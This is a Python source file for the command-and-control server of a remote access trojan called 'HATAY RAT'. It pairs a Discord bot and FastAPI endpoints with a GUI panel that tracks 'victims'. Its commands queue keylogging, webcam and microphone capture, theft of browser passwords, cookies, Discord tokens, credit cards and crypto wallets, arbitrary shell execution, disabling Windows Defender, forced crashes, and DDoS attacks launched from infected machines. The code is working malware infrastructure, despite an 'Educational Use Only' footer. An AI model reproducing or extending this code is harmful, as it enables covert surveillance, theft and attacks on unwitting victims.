import discord
from discord.ext import commands
from fastapi import FastAPI, UploadFile, File, Form, BackgroundTasks
import uvicorn
import asyncio
import threading
import uuid
import time
from typing import Dict, Optional, List
import os

# --- CONFIGURATION ---
# IMPORTANT: Never put your token here! Upload this file to GitHub, 
# then add your token in the "Environment" tab on Render.
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN") 
GUILD_ID = None # Optional: Lock to specific guild if needed

# --- DATA STRUCTURES ---
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
import queue

# --- DATA STRUCTURES ---
class ClientSession:
    def __init__(self, ip: str, hostname: str, username: str):
        self.id = str(uuid.uuid4())[:8]
        self.ip = ip
        self.hostname = hostname
        self.username = username
        self.last_seen = time.time()
        self.command_queue = []
        self.command_results = []

# In-memory storage
sessions: Dict[str, ClientSession] = {}
current_target_id: Optional[str] = None

# GUI Queue for thread-safe updates
gui_queue = queue.Queue()

def log_to_gui(msg):
    gui_queue.put(("log", msg))
    console_log(msg)

# --- DISCORD BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

bot_started = False
bot_lock = threading.Lock()

# --- FASTAPI SETUP ---
app = FastAPI()

@app.on_event("startup")
async def startup_event():
    # Start Discord Bot in background when running on cloud (Render)
    # This prevents the bot from failing if GUI thread isn't used
    threading.Thread(target=run_discord_bot, daemon=True).start()
    print("🚀 FastAPI Server Started")

# --- BOT EVENTS & COMMANDS ---
@bot.event
async def on_ready():
    log_to_gui(f"✅ Discord Bot Ready: {bot.user}")

@bot.command()
async def targets(ctx):
    active_clients = []
    current_time = time.time()
    msg = "**Connected Targets:**\n"
    for cid, session in sessions.items():
        status = "🟢" if current_time - session.last_seen < 30 else "🔴"
        msg += f"`{cid}` | {status} | {session.username}@{session.hostname} | IP: {session.ip}\n"
    if not sessions:
        msg = "No targets connected."
    await ctx.send(msg)

@bot.command()
async def use(ctx, target_id: str):
    global current_target_id
    if target_id in sessions:
        current_target_id = target_id
        await ctx.send(f"✅ Selected target: `{target_id}` ({sessions[target_id].username})")
        gui_queue.put(("target", target_id))
    else:
        await ctx.send(f"❌ Target `{target_id}` not found.")

# Remove default help command
bot.remove_command("help")

def get_help_embed():
    embed = discord.Embed(title="🔴 HATAY RAT - Command Center", color=0xFF0000)
    embed.add_field(name="📊 INFO", value="`!info` `!screenshot` `!camshot` `!targets` `!use <id>`", inline=False)
    embed.add_field(name="📁 FILES", value="`!ls <path>` `!download <path>` `!upload <url> <name>` `!remove <path>`", inline=False)
    embed.add_field(name="🎬 RECORDING", value="`!vidshot <sec>` `!audio <sec>`", inline=False)
    embed.add_field(name="⌨️ KEYLOGGER", value="`!keylog start` `!keylog stop` `!keylog dump`", inline=False)
    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox` `!grab_plus` `!deep_token`", inline=False)
    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown` `!defender_off` `!bsod` `!ddos <ip> <port> <sec>`", inline=False)
    embed.add_field(name="🎭 PRANKS", value="`!stress <sec>` `!troll <message|open|beep|mouse|screamer> <val>`", inline=False)
    embed.set_footer(text="HATAY RAT | Educational Use Only")
    return embed

@bot.command()
async def help(ctx):
    await ctx.send(embed=get_help_embed())

@bot.command()
async def info(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "info")
    await ctx.send(f"⏳ System info requested for `{current_target_id}`...")

@bot.command()
async def screenshot(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "screenshot")
    await ctx.send(f"📸 Screenshot requested for `{current_target_id}`...")

@bot.command()
async def camshot(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "camshot")
    await ctx.send(f"📷 Camera shot requested for `{current_target_id}`...")

@bot.command()
async def vidshot(ctx, sec: int = 5):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "vidshot", str(sec))
    await ctx.send(f"🎬 Video recording ({sec}s) requested for `{current_target_id}`...")

@bot.command()
async def audio(ctx, sec: int = 5):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "audio", str(sec))
    await ctx.send(f"🎤 Audio recording ({sec}s) requested for `{current_target_id}`...")

@bot.command()
async def keylog(ctx, action: str):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    if action not in ["start", "stop", "dump"]:
        return await ctx.send("❌ Invalid action. Use `start`, `stop`, or `dump`.")
    queue_command(current_target_id, "keylog", action)
    await ctx.send(f"⌨️ Keylogger `{action}` requested for `{current_target_id}`.")

@bot.command()
async def cookie(ctx, browser: str = "all"):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "cookie", browser)
    await ctx.send(f"🍪 Cookie grab ({browser}) requested for `{current_target_id}`...")

@bot.command()
async def token(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "token")
    await ctx.send(f"💎 Discord tokens requested for `{current_target_id}`...")

@bot.command()
async def password(ctx, browser: str = "all"):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "pass", browser)
    await ctx.send(f"🔑 Passwords grab ({browser}) requested for `{current_target_id}`...")

# Alias for password
@bot.command(name="pass")
async def pass_cmd(ctx, browser: str = "all"):
    await password(ctx, browser)

@bot.command()
async def card(ctx, browser: str = "all"):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "card", browser)
    await ctx.send(f"💳 Credit cards requested for `{current_target_id}`...")

@bot.command()
async def crypto(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "crypto")
    await ctx.send(f"🪙 Crypto wallets requested for `{current_target_id}`...")

@bot.command()
async def dox(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "dox")
    await ctx.send(f"📂 Full DOX report requested for `{current_target_id}`...")

@bot.command()
async def shell(ctx, *, cmd: str):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "shell", cmd)
    await ctx.send(f"💻 Shell command `{cmd}` queued for `{current_target_id}`.")

@bot.command()
async def wall(ctx, url: str):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "wall", url)
    await ctx.send(f"🖼️ Wallpaper change requested for `{current_target_id}`.")

@bot.command()
async def shutdown(ctx):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "shutdown")
    await ctx.send(f"💀 Shutdown command sent to `{current_target_id}`.")

@bot.command()
async def stress(ctx, sec: int = 60):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    queue_command(current_target_id, "stress", str(sec))
    await ctx.send(f"🔥 Stress mode ({sec}s) triggered on `{current_target_id}`!")

@bot.command()
async def troll(ctx, action: str, *, val: str = ""):
    if not current_target_id:
        return await ctx.send("❌ No target selected. Use `!use <id>` first.")
    payload = f"{action}|{val}" if val else action
    queue_command(current_target_id, "troll", payload)
    await ctx.send(f"🎭 Troll `{action}` sent to `{current_target_id}`.")

@bot.command()
async def ls(ctx, path: str = "."):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "ls", path)
    await ctx.send(f"📁 Listing files for `{path}`...")

@bot.command()
async def download(ctx, path: str):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "download", path)
    await ctx.send(f"📥 Downloading `{path}` from victim...")

@bot.command()
async def upload(ctx, url: str, filename: str):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "upload", f"{url}|{filename}")
    await ctx.send(f"📤 Uploading `{filename}` to victim from URL...")

@bot.command()
async def remove(ctx, path: str):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "remove", path)
    await ctx.send(f"🗑️ Deleting `{path}` on victim...")

@bot.command()
async def defender_off(ctx):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "defender_off")
    await ctx.send(f"🛡️ Disabling Windows Defender on `{current_target_id}`...")

@bot.command()
async def grab_plus(ctx):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "grab_plus")
    await ctx.send(f"🌟 UHQ Grab (History, Games) requested for `{current_target_id}`...")

@bot.command()
async def bsod(ctx):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "bsod")
    await ctx.send(f"☠️ Triggering BSOD on `{current_target_id}`...")

@bot.command()
async def ddos(ctx, target: str, port: int = 80, duration: int = 60):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "ddos", f"{target}|{port}|{duration}")
    await ctx.send(f"🔱 DDoS Attack initiated from victim to `{target}:{port}` for {duration}s!")

@bot.command()
async def deep_token(ctx):
    if not current_target_id: return await ctx.send("❌ No target.")
    queue_command(current_target_id, "deep_token")
    await ctx.send(f"🔍 Deep Token Search (Slow but Global) requested for `{current_target_id}`...")

def queue_command(client_id, type, payload=None):
    if client_id in sessions:
        cmd_id = str(uuid.uuid4())[:6]
        command = {"id": cmd_id, "type": type, "payload": payload}
        sessions[client_id].command_queue.append(command)
        log_to_gui(f"📝 Queued command for {client_id}: {type}")
        return cmd_id
    return None

# --- FASTAPI ENDPOINTS ---
@app.post("/api/register")
async def register(data: dict):
    ip = data.get("ip", "unknown")
    hostname = data.get("hostname", "unknown")
    username = data.get("username", "unknown")
    
    log_to_gui(f"📥 Registration attempt from {username}@{hostname}")
    
    session = ClientSession(ip, hostname, username)
    sessions[session.id] = session
    
    gui_queue.put(("victim", {
        "id": session.id,
        "ip": ip,
        "hostname": hostname,
        "username": username
    }))
    
    async def _notify():
        try:
            await bot.wait_until_ready()
            channel = None
            if bot.guilds:
                guild = bot.guilds[0]
                channel = discord.utils.get(guild.text_channels, name="rat-logs")
                if not channel:
                    channel = guild.text_channels[0]
            
            if channel:
                embed = discord.Embed(title="🔔 New Victim Connected!", color=0x00ff00)
                embed.add_field(name="ID", value=f"`{session.id}`", inline=False)
                embed.add_field(name="User", value=f"{session.username}", inline=True)
                embed.add_field(name="PC Name", value=f"{session.hostname}", inline=True)
                embed.add_field(name="IP", value=f"{session.ip}", inline=True)
                await channel.send(embed=embed)
        except Exception as e:
            log_to_gui(f"[ERROR] Discord Notify: {e}")

    if bot.loop:
        asyncio.run_coroutine_threadsafe(_notify(), bot.loop)

    return {"status": "ok", "id": session.id}

@app.post("/api/poll")
async def poll(data: dict):
    client_id = data.get("id")
    if not client_id or client_id not in sessions:
        return {"status": "error", "message": "Invalid ID"}
    
    session = sessions[client_id]
    session.last_seen = time.time()
    
    if session.command_queue:
        cmd = session.command_queue.pop(0)
        log_to_gui(f"📡 Sending command to {client_id}: {cmd['type']}")
        return {"status": "command", "command": cmd}
    
    return {"status": "idle"}

@app.post("/api/result")
async def receive_result(
    id: str = Form(...),
    cmd_id: str = Form(...),
    type: str = Form(...),
    text_result: str = Form(None),
    file: UploadFile = File(None)
):
    if id not in sessions:
        return {"status": "error", "message": "Unknown Client"}

    log_to_gui(f"📥 Result from {id} for {type}")
    gui_queue.put(("result", {"id": id, "type": type, "text": text_result}))
    
    async def _send_discord_msg(channel_id, text=None, file_bytes=None, filename=None):
        await bot.wait_until_ready()
        channel = bot.get_channel(channel_id)
        if not channel:
            return
            
        if file_bytes:
            import io
            d_file = discord.File(io.BytesIO(file_bytes), filename=filename)
            await channel.send(content=text, file=d_file)
        else:
            await channel.send(content=text)

    target_channel_id = None
    if bot.guilds:
        guild = bot.guilds[0]
        c = discord.utils.get(guild.text_channels, name="rat-logs")
        if not c:
            c = guild.text_channels[0]
        target_channel_id = c.id
    
    if target_channel_id and bot.loop:
        user_header = f"**Result from `{id}` ({type}):**\n"
        
        file_data = None
        fname = None
        
        if file:
            file_data = await file.read()
            fname = file.filename
            
        text_content = user_header
        if text_result:
             if len(text_result) > 1900:
                text_result = text_result[:1900] + "... (truncated)"
             text_content += f"```\n{text_result}\n```"

        asyncio.run_coroutine_threadsafe(
            _send_discord_msg(target_channel_id, text_content, file_data, fname), 
            bot.loop
        )

    return {"status": "ok"}

# --- HEADLESS LOGGING ---
def console_log(msg):
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

# --- GUI ---
if GUI_AVAILABLE:
    class HatayServerGUI:
        def __init__(self, root):
            self.root = root
            self.root.title("Hatay Farhan UHQ PANEL @kisma.xyz")
            self.root.geometry("1100x700")
            self.root.configure(bg="#0a0a0a")
            
            style = ttk.Style()
            style.theme_use("clam")
            style.configure("Treeview", background="#1a1a1a", foreground="#00ff00", 
                           fieldbackground="#1a1a1a", borderwidth=0, font=("Consolas", 9))
            style.configure("Treeview.Heading", background="#0d0d0d", foreground="#00ff00", 
                           font=("Consolas", 10, "bold"))
            style.map("Treeview", background=[('selected', '#333333')])
            
            header = tk.Frame(root, bg="#0d0d0d", height=50)
            header.pack(fill=tk.X)
            
            title_label = tk.Label(header, text="🔴 Hatay Farhan UHQ PANEL @kisma.xyz", 
                                  bg="#0d0d0d", fg="#ff0000", font=("Consolas", 16, "bold"))
            title_label.pack(side=tk.LEFT, padx=20, pady=10)

            btn_frame = tk.Frame(header, bg="#0d0d0d")
            btn_frame.pack(side=tk.RIGHT, padx=10)

            tk.Button(btn_frame, text="REFRESH LIST", bg="#1a1a1a", fg="#00ff00", 
                      font=("Consolas", 9, "bold"), command=self.refresh_list, 
                      relief=tk.FLAT, padx=10).pack(side=tk.LEFT, padx=5)
            
            tk.Button(btn_frame, text="CLEAR LOGS", bg="#1a1a1a", fg="#ffaa00", 
                      font=("Consolas", 9, "bold"), command=self.clear_logs, 
                      relief=tk.FLAT, padx=10).pack(side=tk.LEFT, padx=5)
            
            main_frame = tk.Frame(root, bg="#0a0a0a")
            main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            victims_frame = tk.LabelFrame(main_frame, text=" Connected Victims ", 
                                         bg="#0a0a0a", fg="#00ff00", font=("Consolas", 11, "bold"))
            victims_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
            
            columns = ("ID", "IP", "PC", "User", "Last Seen", "Status")
            self.tree = ttk.Treeview(victims_frame, columns=columns, show="headings", height=12)
            
            for col in columns:
                self.tree.heading(col, text=col.upper())
                self.tree.column(col, width=150, anchor=tk.CENTER)
            
            scrollbar = ttk.Scrollbar(victims_frame, orient=tk.VERTICAL, command=self.tree.yview)
            self.tree.configure(yscroll=scrollbar.set)
            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
            self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            log_frame = tk.LabelFrame(main_frame, text=" Server Activity Logs ", 
                                     bg="#0a0a0a", fg="#00ff00", font=("Consolas", 11, "bold"))
            log_frame.pack(fill=tk.BOTH, expand=True)
            
            self.log_text = scrolledtext.ScrolledText(log_frame, bg="#0d0d0d", fg="#00ff00", 
                                                     font=("Consolas", 10), height=15)
            self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            footer = tk.Frame(root, bg="#0d0d0d", height=30)
            footer.pack(fill=tk.X)
            
            self.status_label = tk.Label(footer, text="⚡ Server Status: Starting...", 
                                        bg="#0d0d0d", fg="#ffff00", font=("Consolas", 10))
            self.status_label.pack(side=tk.LEFT, padx=20, pady=5)
            
            self.victim_count = tk.Label(footer, text="👥 Victims: 0", 
                                        bg="#0d0d0d", fg="#00ff00", font=("Consolas", 10))
            self.victim_count.pack(side=tk.RIGHT, padx=20, pady=5)
            
            self.update_gui()
            self.log("🚀 Hatay Server Initialized")
        
        def log(self, message):
            timestamp = time.strftime("%H:%M:%S")
            self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
            self.log_text.see(tk.END)

        def clear_logs(self):
            self.log_text.delete(1.0, tk.END)
            self.log("🗑️ Logs cleared.")

        def refresh_list(self):
            for item in self.tree.get_children():
                self.tree.delete(item)
            for cid, s in sessions.items():
                dt = time.strftime("%H:%M:%S", time.localtime(s.last_seen))
                status = "🟢 Online" if time.time() - s.last_seen < 30 else "🔴 Offline"
                self.tree.insert("", tk.END, values=(cid, s.ip, s.hostname, s.username, dt, status))
        
        def add_victim(self, data):
            exists = False
            for item in self.tree.get_children():
                if self.tree.item(item)['values'][0] == data["id"]:
                    exists = True
                    break
            if not exists:
                dt = time.strftime("%H:%M:%S")
                self.tree.insert("", tk.END, values=(
                    data["id"], data["ip"], data["hostname"], data["username"], dt, "🟢 Online"
                ))
                self.log(f"🔥 NEW VICTIM CONNECTED: {data['username']}@{data['hostname']} ({data['id']})")
            else:
                self.refresh_list()
            self.update_victim_count()
        
        def update_victim_count(self):
            count = len(sessions)
            self.victim_count.config(text=f"👥 Victims: {count}")
        
        def update_gui(self):
            try:
                while not gui_queue.empty():
                    msg_type, data = gui_queue.get_nowait()
                    if msg_type == "log": self.log(data)
                    elif msg_type == "victim": self.add_victim(data)
                    elif msg_type == "target": self.log(f"🎯 Target Focus set to: {data}")
                    elif msg_type == "result": self.log(f"📥 Received {data['type']} result from {data['id']}")
                    elif msg_type == "status": self.status_label.config(text=f"⚡ Server Status: {data}")
            except: pass
            if int(time.time()) % 5 == 0: self.refresh_list()
            self.root.after(100, self.update_gui)

def run_discord_bot():
    global bot_started
    with bot_lock:
        if bot_started:
            return
        bot_started = True
    try: 
        if not DISCORD_TOKEN:
            log_to_gui("❌ Discord Error: No token provided. Set DISCORD_TOKEN environment variable.")
            return
        bot.run(DISCORD_TOKEN)
    except Exception as e: 
        log_to_gui(f"❌ Discord Error: {e}")
        with bot_lock:
            bot_started = False

def run_fastapi():
    try:
        config = uvicorn.Config(app, host="0.0.0.0", port=8000, log_level="error")
        server = uvicorn.Server(config)
        server.run()
    except OSError as e:
        if e.errno == 10048:
             if GUI_AVAILABLE:
                 messagebox.showerror("Port Error", "Port 8000 already in use!")
             log_to_gui("❌ FATAL: Port 8000 in use.")
        else: log_to_gui(f"❌ API Error: {e}")
    except Exception as e: log_to_gui(f"❌ API Error: {e}")

def start_servers():
    time.sleep(2)
    gui_queue.put(("status", "Running 🟢"))
    threading.Thread(target=run_discord_bot, daemon=True).start()
    threading.Thread(target=run_fastapi, daemon=True).start()

if __name__ == "__main__":
    if GUI_AVAILABLE and not os.getenv("RENDER"):
        root = tk.Tk()
        gui = HatayServerGUI(root)
        threading.Thread(target=start_servers, daemon=True).start()
        root.mainloop()
    else:
        # Headless mode
        console_log("🖥️ Headless Mode (No GUI)")
        start_servers()
        # Keep main thread alive for FastAPI/Discord threads
        while True:
            time.sleep(1)

